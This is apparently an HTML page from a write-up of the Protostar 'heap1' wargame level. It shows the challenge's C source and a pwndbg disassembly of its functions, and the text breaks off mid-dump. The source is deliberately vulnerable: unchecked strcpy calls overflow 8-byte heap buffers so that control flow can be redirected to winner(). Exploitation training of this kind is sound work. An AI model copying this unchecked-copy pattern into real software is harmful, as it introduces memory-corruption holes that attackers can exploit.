+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#heap-one-this-level-takes-a-look-at-code-flow-hijacking-in-data-overwrite-cases-this-level-is-at-optprotostarbinheap1" class="md-nav__link">
+    <span class="md-ellipsis">
+      # Heap One This level takes a look at code flow hijacking in data overwrite cases. This level is at /opt/protostar/bin/heap1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwndbg-disass-winner-dump-of-assembler-code-for-function-winner-0x08048494-0-push-ebp-0x08048495-1-mov-ebpesp-0x08048497-3-sub-esp0x18-0x0804849a-6-mov-dword-ptr-esp0x0-0x080484a1-13-call-0x80483ac-timeplt-0x080484a6-18-mov-edx0x8048630-0x080484ab-23-mov-dword-ptr-esp0x4eax-0x080484af-27-mov-dword-ptr-espedx-0x080484b2-30-call-0x804839c-printfplt-0x080484b7-35-leave-0x080484b8-36-ret-end-of-assembler-dump-pwndbg-disass-ma-main-malloc-mallocgotplt-mallocplt-pwndbg-disass-main-dump-of-assembler-code-for-function-main-0x080484b9-0-push-ebp-0x080484ba-1-mov-ebpesp-0x080484bc-3-and-esp0xfffffff0-0x080484bf-6-sub-esp0x20-0x080484c2-9-mov-dword-ptr-esp0x8-0x080484c9-16-call-0x80483bc-mallocplt-0x080484ce-21-mov-dword-ptr-esp0x14eax-0x080484d2-25-mov-eaxdword-ptr-esp0x14-0x080484d6-29-mov-dword-ptr-eax0x1-0x080484dc-35-mov-dword-ptr-esp0x8-0x080484e3-42-call-0x80483bc-mallocplt-0x080484e8-47-mov-edxeax-0x080484ea-49-mov-eaxdword-ptr-esp0x14-0x080484ee-53-mov-dword-ptr-eax0x4edx-0x080484f1-56-mov-dword-ptr-esp0x8-0x080484f8-63-call-0x80483bc-mallocplt-0x080484fd-68-mov-dword-ptr-esp0x18eax-0x08048501-72-mov-eaxdword-ptr-esp0x18-0x08048505-76-mov-dword-ptr-eax0x2-0x0804850b-82-mov-dword-ptr-esp0x8-0x08048512-89-call-0x80483bc-mallocplt-0x08048517-94-mov-edxeax-0x08048519-96-mov-eaxdword-ptr-esp0x18-0x0804851d-100-mov-dword-ptr-eax0x4edx-0x08048520-103-mov-eaxdword-ptr-ebp0xc-0x08048523-106-add-eax0x4-0x08048526-109-mov-eaxdword-ptr-eax-0x08048528-111-mov-edxeax-0x0804852a-113-mov-eaxdword-ptr-esp0x14-0x0804852e-117-mov-eaxdword-ptr-eax0x4-0x08048531-120-mov-dword-ptr-esp0x4edx-0x08048535-124-mov-dword-ptr-espeax-0x08048538-127-call-0x804838c-strcpyplt-0x0804853d-132-mov-eaxdword-ptr-ebp0xc-0x08048540-135-add-eax0x8-0x08048543-138-mov-eaxdword-ptr-eax-0x08048545-140-mov-edxeax-0x08048547-142-mov-eaxdword-ptr-esp0x18-0x0804854b-146-mov-eaxdword-ptr-eax0x4-0x0804854e-149-mov-dword-ptr-esp0x4edx-0x08048552-153-mov-dword-ptr-espeax-0x08048555-156-call-0x804838c-strcpyplt-0x0804855a-161-mov-dword-ptr-esp0x804864b-0x08048561-168-call-0x80483cc-putsplt-0x08048566-173-leave-0x08048567-174-ret-end-of-assembler-dump" class="md-nav__link">
+    <span class="md-ellipsis">
+      pwndbg&gt; disass winner Dump of assembler code for function winner: 0x08048494 &lt;+0&gt;: push ebp 0x08048495 &lt;+1&gt;: mov ebp,esp 0x08048497 &lt;+3&gt;: sub esp,0x18 0x0804849a &lt;+6&gt;: mov DWORD PTR [esp],0x0 0x080484a1 &lt;+13&gt;: call 0x80483ac &lt;time@plt&gt; 0x080484a6 &lt;+18&gt;: mov edx,0x8048630 0x080484ab &lt;+23&gt;: mov DWORD PTR [esp+0x4],eax 0x080484af &lt;+27&gt;: mov DWORD PTR [esp],edx 0x080484b2 &lt;+30&gt;: call 0x804839c &lt;printf@plt&gt; 0x080484b7 &lt;+35&gt;: leave 0x080484b8 &lt;+36&gt;: ret End of assembler dump. pwndbg&gt; disass ma main malloc malloc@got[plt] malloc@plt pwndbg&gt; disass main Dump of assembler code for function main: 0x080484b9 &lt;+0&gt;: push ebp 0x080484ba &lt;+1&gt;: mov ebp,esp 0x080484bc &lt;+3&gt;: and esp,0xfffffff0 0x080484bf &lt;+6&gt;: sub esp,0x20 0x080484c2 &lt;+9&gt;: mov DWORD PTR [esp],0x8 0x080484c9 &lt;+16&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x080484ce &lt;+21&gt;: mov DWORD PTR [esp+0x14],eax 0x080484d2 &lt;+25&gt;: mov eax,DWORD PTR [esp+0x14] 0x080484d6 &lt;+29&gt;: mov DWORD PTR [eax],0x1 0x080484dc &lt;+35&gt;: mov DWORD PTR [esp],0x8 0x080484e3 &lt;+42&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x080484e8 &lt;+47&gt;: mov edx,eax 0x080484ea &lt;+49&gt;: mov eax,DWORD PTR [esp+0x14] 0x080484ee &lt;+53&gt;: mov DWORD PTR [eax+0x4],edx 0x080484f1 &lt;+56&gt;: mov DWORD PTR [esp],0x8 0x080484f8 &lt;+63&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x080484fd &lt;+68&gt;: mov DWORD PTR [esp+0x18],eax 0x08048501 &lt;+72&gt;: mov eax,DWORD PTR [esp+0x18] 0x08048505 &lt;+76&gt;: mov DWORD PTR [eax],0x2 0x0804850b &lt;+82&gt;: mov DWORD PTR [esp],0x8 0x08048512 &lt;+89&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x08048517 &lt;+94&gt;: mov edx,eax 0x08048519 &lt;+96&gt;: mov eax,DWORD PTR [esp+0x18] 0x0804851d &lt;+100&gt;: mov DWORD PTR [eax+0x4],edx 0x08048520 &lt;+103&gt;: mov eax,DWORD PTR [ebp+0xc] 0x08048523 &lt;+106&gt;: add eax,0x4 0x08048526 &lt;+109&gt;: mov eax,DWORD PTR [eax] 0x08048528 &lt;+111&gt;: mov edx,eax 0x0804852a &lt;+113&gt;: mov eax,DWORD PTR [esp+0x14] 0x0804852e &lt;+117&gt;: mov eax,DWORD PTR [eax+0x4] 0x08048531 &lt;+120&gt;: mov DWORD PTR [esp+0x4],edx 0x08048535 &lt;+124&gt;: mov DWORD PTR [esp],eax 0x08048538 &lt;+127&gt;: call 0x804838c &lt;strcpy@plt&gt; 0x0804853d &lt;+132&gt;: mov eax,DWORD PTR [ebp+0xc] 0x08048540 &lt;+135&gt;: add eax,0x8 0x08048543 &lt;+138&gt;: mov eax,DWORD PTR [eax] 0x08048545 &lt;+140&gt;: mov edx,eax 0x08048547 &lt;+142&gt;: mov eax,DWORD PTR [esp+0x18] 0x0804854b &lt;+146&gt;: mov eax,DWORD PTR [eax+0x4] 0x0804854e &lt;+149&gt;: mov DWORD PTR [esp+0x4],edx 0x08048552 &lt;+153&gt;: mov DWORD PTR [esp],eax 0x08048555 &lt;+156&gt;: call 0x804838c &lt;strcpy@plt&gt; 0x0804855a &lt;+161&gt;: mov DWORD PTR [esp],0x804864b 0x08048561 &lt;+168&gt;: call 0x80483cc &lt;puts@plt&gt; 0x08048566 &lt;+173&gt;: leave 0x08048567 &lt;+174&gt;: ret End of assembler dump.
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Protostar heap1</h1>
+
+<h2 id="heap-one-this-level-takes-a-look-at-code-flow-hijacking-in-data-overwrite-cases-this-level-is-at-optprotostarbinheap1"><div class="highlight"><pre><span></span><code># Heap One
+
+This level takes a look at code flow hijacking in data overwrite cases.
+
+This level is at /opt/protostar/bin/heap1
+</code></pre></div></h2>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">priority</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and we have a winner @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="o">*</span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i3</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">i1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span>
+<span class="w">  </span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">  </span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">i2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span>
+<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and that&#39;s a wrap folks!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="pwndbg-disass-winner-dump-of-assembler-code-for-function-winner-0x08048494-0-push-ebp-0x08048495-1-mov-ebpesp-0x08048497-3-sub-esp0x18-0x0804849a-6-mov-dword-ptr-esp0x0-0x080484a1-13-call-0x80483ac-timeplt-0x080484a6-18-mov-edx0x8048630-0x080484ab-23-mov-dword-ptr-esp0x4eax-0x080484af-27-mov-dword-ptr-espedx-0x080484b2-30-call-0x804839c-printfplt-0x080484b7-35-leave-0x080484b8-36-ret-end-of-assembler-dump-pwndbg-disass-ma-main-malloc-mallocgotplt-mallocplt-pwndbg-disass-main-dump-of-assembler-code-for-function-main-0x080484b9-0-push-ebp-0x080484ba-1-mov-ebpesp-0x080484bc-3-and-esp0xfffffff0-0x080484bf-6-sub-esp0x20-0x080484c2-9-mov-dword-ptr-esp0x8-0x080484c9-16-call-0x80483bc-mallocplt-0x080484ce-21-mov-dword-ptr-esp0x14eax-0x080484d2-25-mov-eaxdword-ptr-esp0x14-0x080484d6-29-mov-dword-ptr-eax0x1-0x080484dc-35-mov-dword-ptr-esp0x8-0x080484e3-42-call-0x80483bc-mallocplt-0x080484e8-47-mov-edxeax-0x080484ea-49-mov-eaxdword-ptr-esp0x14-0x080484ee-53-mov-dword-ptr-eax0x4edx-0x080484f1-56-mov-dword-ptr-esp0x8-0x080484f8-63-call-0x80483bc-mallocplt-0x080484fd-68-mov-dword-ptr-esp0x18eax-0x08048501-72-mov-eaxdword-ptr-esp0x18-0x08048505-76-mov-dword-ptr-eax0x2-0x0804850b-82-mov-dword-ptr-esp0x8-0x08048512-89-call-0x80483bc-mallocplt-0x08048517-94-mov-edxeax-0x08048519-96-mov-eaxdword-ptr-esp0x18-0x0804851d-100-mov-dword-ptr-eax0x4edx-0x08048520-103-mov-eaxdword-ptr-ebp0xc-0x08048523-106-add-eax0x4-0x08048526-109-mov-eaxdword-ptr-eax-0x08048528-111-mov-edxeax-0x0804852a-113-mov-eaxdword-ptr-esp0x14-0x0804852e-117-mov-eaxdword-ptr-eax0x4-0x08048531-120-mov-dword-ptr-esp0x4edx-0x08048535-124-mov-dword-ptr-espeax-0x08048538-127-call-0x804838c-strcpyplt-0x0804853d-132-mov-eaxdword-ptr-ebp0xc-0x08048540-135-add-eax0x8-0x08048543-138-mov-eaxdword-ptr-eax-0x08048545-140-mov-edxeax-0x08048547-142-mov-eaxdword-ptr-esp0x18-0x0804854b-146-mov-eaxdword-ptr-eax0x4-0x0804854e-149-mov-dword-ptr-esp0x4edx-0x08048552-153-mov-dword-ptr-espeax-0x08048555-156-call-0x804838c-strcpyplt-0x0804855a-161-mov-dword-ptr-esp0x804864b-0x08048561-168-call-0x80483cc-putsplt-0x08048566-173-leave-0x08048567-174-ret-end-of-assembler-dump"><div class="highlight"><pre><span></span><code><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">disass</span><span class="w"> </span><span class="n">winner</span><span class="w"> </span>
+<span class="n">Dump</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">winner</span><span class="o">:</span>
+<span class="w">   </span><span class="mh">0x08048494</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span>
+<span class="w">   </span><span class="mh">0x08048495</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+<span class="w">   </span><span class="mh">0x08048497</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x18</span>
+<span class="w">   </span><span class="mh">0x0804849a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x0</span>
+<span class="w">   </span><span class="mh">0x080484a1</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483ac</span><span class="w"> </span><span class="o">&lt;</span><span class="n">time</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x080484a6</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="mh">0x8048630</span>
+<span class="w">   </span><span class="mh">0x080484ab</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x080484af</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x080484b2</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x804839c</span><span class="w"> </span><span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x080484b7</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">leave</span>
+<span class="w">   </span><span class="mh">0x080484b8</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">ret</span>
+<span class="n">End</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">dump</span><span class="p">.</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">disass</span><span class="w"> </span><span class="n">ma</span>
+<span class="n">main</span><span class="w">             </span><span class="n">malloc</span><span class="w">           </span><span class="n">malloc</span><span class="err">@</span><span class="n">got</span><span class="p">[</span><span class="n">plt</span><span class="p">]</span><span class="w">  </span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="w">       </span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">disass</span><span class="w"> </span><span class="n">main</span>
+<span class="n">Dump</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">main</span><span class="o">:</span>
+<span class="w">   </span><span class="mh">0x080484b9</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span>
+<span class="w">   </span><span class="mh">0x080484ba</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+<span class="w">   </span><span class="mh">0x080484bc</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">and</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
+<span class="w">   </span><span class="mh">0x080484bf</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
+<span class="w">   </span><span class="mh">0x080484c2</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span><span class="w">     </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x080484c9</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x080484ce</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x080484d2</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x080484d6</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="mh">0x1</span>
+<span class="w">   </span><span class="mh">0x080484dc</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x080484e3</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x080484e8</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x080484ea</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x080484ee</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x080484f1</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x080484f8</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x080484fd</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048501</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048505</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">76</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="mh">0x2</span>
+<span class="w">   </span><span class="mh">0x0804850b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">82</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>
+<span class="w">   </span><span class="mh">0x08048512</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483bc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x08048517</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x08048519</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804851d</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x08048520</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">103</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048523</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">106</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">add</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
+<span class="w">   </span><span class="mh">0x08048526</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">109</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x08048528</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">111</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x0804852a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">113</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x0804852e</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">117</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
